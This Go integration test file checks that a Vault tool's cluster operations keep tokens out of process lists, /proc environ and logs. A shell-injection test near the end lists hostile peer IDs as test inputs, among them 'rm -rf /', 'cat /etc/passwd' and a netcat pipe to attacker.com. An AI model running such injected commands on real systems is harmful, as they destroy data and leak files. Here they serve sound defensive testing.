// +build integration

package vault

import (
	"bufio"
	"context"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"testing"
	"time"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/eos_io"
	"go.uber.org/zap"
	"go.uber.org/zap/zaptest"
)

// TestRaftAutopilot_Integration_WithTokenFile tests full Autopilot configuration
// workflow using token file (P0-1 fix validation)
func TestRaftAutopilot_Integration_WithTokenFile(t *testing.T) {
	// INTEGRATION TEST: End-to-end Raft Autopilot configuration with token file
	// REQUIREMENT: Vault cluster running in Raft mode with valid token
	// VALIDATES: P0-1 fix (token not exposed in environment)

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	if !isVaultClusterMode(t) {
		t.Skip("Vault not in cluster mode, skipping Raft Autopilot test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Configure Autopilot using token file
	err := ConfigureRaftAutopilot(rc, token)

	if err != nil {
		t.Fatalf("ConfigureRaftAutopilot failed: %v", err)
	}

	t.Logf("✓ Raft Autopilot configured successfully using token file")
}

// TestGetAutopilotState_Integration_WithTokenFile tests Autopilot state retrieval
func TestGetAutopilotState_Integration_WithTokenFile(t *testing.T) {
	// INTEGRATION TEST: Retrieve Autopilot state using token file
	// VALIDATES: P0-1 fix + Autopilot state retrieval

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	if !isVaultClusterMode(t) {
		t.Skip("Vault not in cluster mode, skipping Raft Autopilot test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Get Autopilot state
	state, err := GetAutopilotState(rc, token)

	if err != nil {
		t.Fatalf("GetAutopilotState failed: %v", err)
	}

	if state == "" {
		t.Error("Autopilot state is empty")
	}

	t.Logf("✓ Autopilot state retrieved successfully")
	t.Logf("State (truncated): %s", truncateString(state, 200))
}

// TestTakeRaftSnapshot_Integration_WithTokenFile tests Raft snapshot operation
func TestTakeRaftSnapshot_Integration_WithTokenFile(t *testing.T) {
	// INTEGRATION TEST: Take Raft snapshot using token file
	// SECURITY VALIDATION: Token not exposed during snapshot operation
	// COMPLIANCE: PCI-DSS 3.2.1 (Do not store after authorization)

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	if !isVaultClusterMode(t) {
		t.Skip("Vault not in cluster mode, skipping Raft snapshot test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Create temporary snapshot file
	snapshotFile := fmt.Sprintf("/tmp/vault-snapshot-test-%d.snap", time.Now().Unix())
	defer os.Remove(snapshotFile)

	// Take Raft snapshot
	err := TakeRaftSnapshot(rc, token, snapshotFile)

	if err != nil {
		t.Fatalf("TakeRaftSnapshot failed: %v", err)
	}

	// Verify snapshot file exists
	info, err := os.Stat(snapshotFile)
	if err != nil {
		t.Fatalf("Snapshot file not created: %v", err)
	}

	if info.Size() == 0 {
		t.Error("Snapshot file is empty")
	}

	t.Logf("✓ Raft snapshot created successfully: %s", snapshotFile)
	t.Logf("✓ Snapshot size: %d bytes", info.Size())
}

// TestRestoreRaftSnapshot_Integration_WithTokenFile tests Raft snapshot restore
func TestRestoreRaftSnapshot_Integration_WithTokenFile(t *testing.T) {
	// INTEGRATION TEST: Restore Raft snapshot using token file
	// WARNING: This test is DESTRUCTIVE if run on production
	// REQUIREMENT: Test Vault cluster only

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	if !isVaultClusterMode(t) {
		t.Skip("Vault not in cluster mode, skipping Raft restore test")
	}

	// SAFETY CHECK: Only run on test environments
	if !isTestEnvironment() {
		t.Skip("Not a test environment, skipping destructive Raft restore test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// First take a snapshot
	snapshotFile := fmt.Sprintf("/tmp/vault-snapshot-restore-test-%d.snap", time.Now().Unix())
	defer os.Remove(snapshotFile)

	err := TakeRaftSnapshot(rc, token, snapshotFile)
	if err != nil {
		t.Fatalf("Failed to take snapshot for restore test: %v", err)
	}

	// Attempt restore (with force flag for test)
	// NOTE: This is destructive, only safe in test environment
	err = RestoreRaftSnapshot(rc, token, snapshotFile)

	if err != nil {
		// Restore might fail if cluster is active - this is expected
		t.Logf("⚠ Snapshot restore failed (expected if cluster active): %v", err)
	} else {
		t.Logf("✓ Snapshot restore succeeded")
	}

	t.Logf("✓ Snapshot restore operation completed")
}

// TestTokenExposurePrevention_ProcessList tests that token is NOT visible
// in process list during cluster operations (P0-1 validation)
func TestTokenExposurePrevention_ProcessList(t *testing.T) {
	// SECURITY TEST: Verify token not exposed in ps output (P0-1 fix)
	// ATTACK VECTOR: ps auxe | grep VAULT_TOKEN
	// MITIGATION: Use VAULT_TOKEN_FILE instead of VAULT_TOKEN

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Start a long-running operation in background
	// We'll check ps output while it's running
	done := make(chan bool)
	errChan := make(chan error)

	go func() {
		// This operation takes a few seconds, giving us time to check ps
		err := ConfigureRaftAutopilot(rc, token)
		errChan <- err
		done <- true
	}()

	// Give operation time to start
	time.Sleep(500 * time.Millisecond)

	// Check process list for token exposure
	tokenExposed := checkProcessListForToken(t, token)

	// Wait for operation to complete
	select {
	case <-done:
		err := <-errChan
		if err != nil {
			t.Logf("Background operation error (non-fatal): %v", err)
		}
	case <-time.After(10 * time.Second):
		t.Error("Background operation timed out")
	}

	// Assert token was NOT exposed
	if tokenExposed {
		t.Error("SECURITY VIOLATION: Token exposed in process list")
	} else {
		t.Logf("✓ Token NOT exposed in process list (P0-1 fix validated)")
	}
}

// TestTokenExposurePrevention_ProcEnviron tests that token is NOT visible
// in /proc/<pid>/environ during cluster operations
func TestTokenExposurePrevention_ProcEnviron(t *testing.T) {
	// SECURITY TEST: Verify token not in /proc/<pid>/environ (P0-1 fix)
	// ATTACK VECTOR: cat /proc/<pid>/environ | grep VAULT_TOKEN
	// MITIGATION: Use VAULT_TOKEN_FILE instead of VAULT_TOKEN

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Start operation in background
	done := make(chan bool)
	pidChan := make(chan int)

	go func() {
		// Launch vault command and capture its PID
		cmd := exec.Command("vault", "operator", "raft", "autopilot", "state", "-format=json")

		// Create token file
		tokenFile, err := createTemporaryTokenFile(rc, token)
		if err != nil {
			done <- true
			return
		}
		defer os.Remove(tokenFile.Name())

		cmd.Env = append(os.Environ(),
			fmt.Sprintf("VAULT_TOKEN_FILE=%s", tokenFile.Name()),
			"VAULT_ADDR="+getVaultAddr(),
			"VAULT_SKIP_VERIFY=1",
		)

		if err := cmd.Start(); err != nil {
			done <- true
			return
		}

		pidChan <- cmd.Process.Pid
		cmd.Wait()
		done <- true
	}()

	// Get PID and check /proc
	var pid int
	select {
	case pid = <-pidChan:
		// Check /proc/<pid>/environ for token
		tokenExposed := checkProcEnvironForToken(t, pid, token)

		if tokenExposed {
			t.Error("SECURITY VIOLATION: Token exposed in /proc/<pid>/environ")
		} else {
			t.Logf("✓ Token NOT in /proc/%d/environ (P0-1 fix validated)", pid)
		}
	case <-time.After(5 * time.Second):
		t.Error("Timed out waiting for PID")
	}

	// Wait for completion
	<-done
}

// TestTokenFileLeak_MultipleOperations tests that token files don't accumulate
// during multiple cluster operations
func TestTokenFileLeak_MultipleOperations(t *testing.T) {
	// RESOURCE TEST: Verify token files are cleaned up between operations
	// RATIONALE: Multiple operations should not leave orphaned token files

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Count token files before
	beforeCount := countTokenFiles(t)

	// Perform multiple operations
	for i := 0; i < 10; i++ {
		// Each operation creates and should cleanup token file
		_, err := GetAutopilotState(rc, token)
		if err != nil {
			t.Logf("Operation %d failed (non-fatal): %v", i, err)
		}
	}

	// Give time for cleanup
	time.Sleep(100 * time.Millisecond)

	// Count token files after
	afterCount := countTokenFiles(t)

	// Should not have accumulated token files
	leaked := afterCount - beforeCount
	if leaked > 5 {  // Allow small variance
		t.Errorf("Token file leak detected: %d files leaked", leaked)
	}

	t.Logf("✓ No significant token file leak (leaked: %d)", leaked)
}

// TestClusterOperations_WithExpiredToken tests graceful handling of expired tokens
func TestClusterOperations_WithExpiredToken(t *testing.T) {
	// ERROR HANDLING TEST: Verify graceful failure with expired token
	// EXPECTED: Clear error message, not cryptic failure

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)

	// Use obviously invalid token
	invalidToken := "hvs.INVALID_EXPIRED_TOKEN"

	// Attempt operation with expired token
	_, err := GetAutopilotState(rc, invalidToken)

	if err == nil {
		t.Error("Expected error with invalid token, got nil")
	} else {
		// Verify error message is informative
		errMsg := err.Error()
		if !strings.Contains(errMsg, "failed") && !strings.Contains(errMsg, "error") {
			t.Errorf("Error message not informative: %s", errMsg)
		}
		t.Logf("✓ Invalid token handled gracefully: %v", err)
	}
}

// TestClusterOperations_ConcurrentSafety tests concurrent cluster operations
func TestClusterOperations_ConcurrentSafety(t *testing.T) {
	// CONCURRENCY TEST: Verify concurrent cluster operations are safe
	// RATIONALE: Multiple admins may run operations simultaneously

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	const numConcurrent = 5
	errChan := make(chan error, numConcurrent)

	// Launch concurrent operations
	for i := 0; i < numConcurrent; i++ {
		go func(id int) {
			_, err := GetAutopilotState(rc, token)
			if err != nil {
				errChan <- fmt.Errorf("goroutine %d: %w", id, err)
			} else {
				errChan <- nil
			}
		}(i)
	}

	// Collect results
	var errors []error
	for i := 0; i < numConcurrent; i++ {
		if err := <-errChan; err != nil {
			errors = append(errors, err)
		}
	}

	if len(errors) > 0 {
		t.Errorf("Concurrent operations had %d errors:", len(errors))
		for _, err := range errors {
			t.Logf("  %v", err)
		}
	} else {
		t.Logf("✓ Concurrent operations completed successfully (%d goroutines)", numConcurrent)
	}
}

// Helper functions

func createTestRuntimeContextForCluster(t *testing.T) *eos_io.RuntimeContext {
	logger := zaptest.NewLogger(t, zaptest.Level(zap.DebugLevel))
	ctx := context.Background()

	return &eos_io.RuntimeContext{
		Ctx:    ctx,
		Logger: logger,
	}
}

func isVaultAvailable(t *testing.T) bool {
	// Check if vault binary exists
	if _, err := exec.LookPath("vault"); err != nil {
		t.Logf("vault binary not found: %v", err)
		return false
	}

	// Check if Vault server is responding
	cmd := exec.Command("vault", "status", "-format=json")
	cmd.Env = append(os.Environ(),
		"VAULT_ADDR="+getVaultAddr(),
		"VAULT_SKIP_VERIFY=1",
	)

	if err := cmd.Run(); err != nil {
		t.Logf("Vault server not responding: %v", err)
		return false
	}

	return true
}

func isVaultClusterMode(t *testing.T) bool {
	// Check if Vault is in Raft cluster mode
	cmd := exec.Command("vault", "operator", "raft", "configuration", "-format=json")
	cmd.Env = append(os.Environ(),
		"VAULT_ADDR="+getVaultAddr(),
		"VAULT_SKIP_VERIFY=1",
	)

	// Need token for this check
	token := os.Getenv("VAULT_TOKEN_TEST")
	if token == "" {
		t.Logf("VAULT_TOKEN_TEST not set, assuming non-cluster mode")
		return false
	}

	cmd.Env = append(cmd.Env, "VAULT_TOKEN="+token)

	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Logf("Vault not in Raft mode: %v\nOutput: %s", err, string(output))
		return false
	}

	return true
}

func getTestVaultToken(t *testing.T) string {
	token := os.Getenv("VAULT_TOKEN_TEST")
	if token == "" {
		t.Skip("VAULT_TOKEN_TEST not set, skipping test requiring authentication")
	}
	return token
}

func getVaultAddr() string {
	addr := os.Getenv("VAULT_ADDR")
	if addr == "" {
		addr = "https://localhost:8200"
	}
	return addr
}

func isTestEnvironment() bool {
	// Check if we're in a test environment (not production)
	testEnv := os.Getenv("EOS_TEST_ENVIRONMENT")
	return testEnv == "true" || testEnv == "1"
}

func checkProcessListForToken(t *testing.T, token string) bool {
	// Check if token appears in process list output
	cmd := exec.Command("ps", "auxe")
	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Logf("Failed to run ps command: %v", err)
		return false
	}

	outputStr := string(output)

	// Check for actual token value
	if strings.Contains(outputStr, token) {
		t.Logf("SECURITY VIOLATION: Token found in ps output")
		return true
	}

	// Check for VAULT_TOKEN=<value> pattern
	if strings.Contains(outputStr, "VAULT_TOKEN="+token) {
		t.Logf("SECURITY VIOLATION: VAULT_TOKEN=<value> found in ps output")
		return true
	}

	// Verify VAULT_TOKEN_FILE IS present (expected)
	if !strings.Contains(outputStr, "VAULT_TOKEN_FILE=") {
		t.Logf("⚠ VAULT_TOKEN_FILE not found in ps output (might be expected)")
	}

	return false
}

func checkProcEnvironForToken(t *testing.T, pid int, token string) bool {
	// Read /proc/<pid>/environ
	environFile := fmt.Sprintf("/proc/%d/environ", pid)

	data, err := os.ReadFile(environFile)
	if err != nil {
		t.Logf("Failed to read %s: %v", environFile, err)
		return false
	}

	environStr := string(data)

	// Check for token value
	if strings.Contains(environStr, token) {
		t.Logf("SECURITY VIOLATION: Token found in %s", environFile)
		return true
	}

	// Check for VAULT_TOKEN=<value>
	if strings.Contains(environStr, "VAULT_TOKEN="+token) {
		t.Logf("SECURITY VIOLATION: VAULT_TOKEN=<value> in %s", environFile)
		return true
	}

	return false
}

func countTokenFiles(t *testing.T) int {
	// Count vault-token-* files in /tmp
	tmpDir := "/tmp"
	entries, err := os.ReadDir(tmpDir)
	if err != nil {
		t.Logf("Failed to read /tmp: %v", err)
		return 0
	}

	count := 0
	for _, entry := range entries {
		if strings.HasPrefix(entry.Name(), "vault-token-") {
			count++
		}
	}

	return count
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen] + "..."
}

// TestRaftPeerRemoval_Integration tests removing a Raft peer using token file
func TestRaftPeerRemoval_Integration(t *testing.T) {
	// INTEGRATION TEST: Remove Raft peer using token file
	// WARNING: Destructive if run on production
	// REQUIREMENT: Multi-node test cluster only

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	if !isVaultClusterMode(t) {
		t.Skip("Vault not in cluster mode, skipping Raft peer removal test")
	}

	if !isTestEnvironment() {
		t.Skip("Not a test environment, skipping destructive peer removal test")
	}

	// This test requires a specific test peer ID
	testPeerID := os.Getenv("VAULT_TEST_PEER_ID")
	if testPeerID == "" {
		t.Skip("VAULT_TEST_PEER_ID not set, skipping peer removal test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Attempt to remove peer
	err := RemoveRaftPeer(rc, token, testPeerID)

	if err != nil {
		// May fail if peer doesn't exist or cluster policy prevents removal
		t.Logf("⚠ Peer removal failed (may be expected): %v", err)
	} else {
		t.Logf("✓ Raft peer removed successfully: %s", testPeerID)
	}
}

// TestVaultOperatorCommands_ShellInjectionPrevention tests that user input
// is properly sanitized in shell commands
func TestVaultOperatorCommands_ShellInjectionPrevention(t *testing.T) {
	// SECURITY TEST: Verify shell injection prevention
	// THREAT MODEL: Malicious peer ID with shell metacharacters

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Try malicious peer IDs with shell metacharacters
	maliciousPeerIDs := []string{
		"peer; rm -rf /",
		"peer && cat /etc/passwd",
		"peer | nc attacker.com 1234",
		"peer`whoami`",
		"peer$(whoami)",
	}

	for _, peerID := range maliciousPeerIDs {
		err := RemoveRaftPeer(rc, token, peerID)

		// Should fail safely (peer doesn't exist), not execute injection
		if err == nil {
			t.Errorf("SECURITY VIOLATION: Malicious peer ID succeeded: %s", peerID)
		} else {
			t.Logf("✓ Malicious peer ID rejected: %s", peerID)
		}
	}
}

// TestClusterOperations_LoggingNoTokenLeakage tests that tokens are not
// logged during cluster operations
func TestClusterOperations_LoggingNoTokenLeakage(t *testing.T) {
	// SECURITY TEST: Verify tokens not logged (even at DEBUG level)
	// COMPLIANCE: PCI-DSS 3.2.1 (Do not store after authorization)

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	// Create logger that captures output
	var logOutput strings.Builder
	logger := zap.New(
		zaptest.NewLogger(t).Core(),
		zap.Development(),
	)

	rc := &eos_io.RuntimeContext{
		Ctx:    context.Background(),
		Logger: logger,
	}

	token := getTestVaultToken(t)

	// Perform operation (will generate logs)
	_, err := GetAutopilotState(rc, token)
	if err != nil {
		t.Logf("Operation error (non-fatal): %v", err)
	}

	// Check log output for token leakage
	logStr := logOutput.String()

	if strings.Contains(logStr, token) {
		t.Error("SECURITY VIOLATION: Token found in log output")
		t.Logf("Log excerpt: %s", truncateString(logStr, 500))
	} else {
		t.Logf("✓ Token not leaked in log output")
	}

	// Verify sanitized token prefix IS logged (acceptable)
	if strings.Contains(logStr, "hvs.***") || strings.Contains(logStr, "s.***") {
		t.Logf("✓ Sanitized token prefix logged (acceptable)")
	}
}

// TestRaftSnapshot_EmptyOutputPath tests error handling for empty snapshot path
func TestRaftSnapshot_EmptyOutputPath(t *testing.T) {
	// ERROR HANDLING TEST: Verify graceful error for empty output path

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Try to take snapshot with empty output path
	err := TakeRaftSnapshot(rc, token, "")

	if err == nil {
		t.Error("Expected error for empty snapshot path, got nil")
	} else {
		t.Logf("✓ Empty snapshot path handled gracefully: %v", err)
	}
}

// TestRaftSnapshot_PermissionDenied tests handling of permission denied errors
func TestRaftSnapshot_PermissionDenied(t *testing.T) {
	// ERROR HANDLING TEST: Verify graceful error for permission denied

	if !isVaultAvailable(t) {
		t.Skip("Vault not available, skipping integration test")
	}

	rc := createTestRuntimeContextForCluster(t)
	token := getTestVaultToken(t)

	// Try to write snapshot to unwritable location
	unwritablePath := "/root/vault-snapshot-test.snap"

	err := TakeRaftSnapshot(rc, token, unwritablePath)

	if err == nil {
		t.Logf("⚠ Snapshot write succeeded to %s (running as root?)", unwritablePath)
		os.Remove(unwritablePath)
	} else {
		t.Logf("✓ Permission denied handled gracefully: %v", err)
	}
}

// Benchmark tests

func BenchmarkTokenFileCreation(b *testing.B) {
	// PERFORMANCE BENCHMARK: Measure token file creation overhead

	rc := &eos_io.RuntimeContext{
		Ctx:    context.Background(),
		Logger: zap.NewNop(),
	}

	token := "hvs.CAESIJ1234567890abcdefghijklmnopqrstuvwxyz"

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		tokenFile, err := createTemporaryTokenFile(rc, token)
		if err != nil {
			b.Fatalf("Token file creation failed: %v", err)
		}
		os.Remove(tokenFile.Name())
	}
}

func BenchmarkTokenFileVsEnvVar(b *testing.B) {
	// PERFORMANCE COMPARISON: Token file vs environment variable

	rc := &eos_io.RuntimeContext{
		Ctx:    context.Background(),
		Logger: zap.NewNop(),
	}

	token := "hvs.CAESIJ1234567890abcdefghijklmnopqrstuvwxyz"

	b.Run("TokenFile", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			tokenFile, _ := createTemporaryTokenFile(rc, token)
			cmd := exec.Command("echo", "test")
			cmd.Env = append(os.Environ(), fmt.Sprintf("VAULT_TOKEN_FILE=%s", tokenFile.Name()))
			cmd.Run()
			os.Remove(tokenFile.Name())
		}
	})

	b.Run("EnvVar", func(b *testing.B) {
		for i := 0; i < b.N; i++ {
			cmd := exec.Command("echo", "test")
			cmd.Env = append(os.Environ(), fmt.Sprintf("VAULT_TOKEN=%s", token))
			cmd.Run()
		}
	})
}
